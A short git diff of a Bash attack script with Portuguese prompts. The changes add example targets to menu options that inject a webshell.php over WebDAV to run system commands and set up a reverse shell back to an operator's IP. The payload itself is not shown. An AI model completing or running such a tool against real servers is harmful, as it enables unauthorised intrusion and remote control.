@@ -765,7 +765,7 @@ do
 	    
 	    "1") # Executar comandos sistema - Injetando webshell.php WEBDAV  
             		 
-                      echo "Digite o IP or Dom/Pasta"
+                      echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
                       read ip
                       echo "Digite o Comando (ex: id)"
              	      read comando
@@ -777,7 +777,7 @@ do
             "2") # Injetando webshell.php WEBDAV  
             	      echo "Lembre-se de ouvir a porta Reversa"
                       echo
-                      echo "Digite o IP or Dom/Pasta Alvo"
+                      echo "Digite o IP or Dom/Pasta Alvo Ex: 192.168.1.5/dav"
                       read ip
                       echo "Digite o IP reverso"
                       read ipreverso
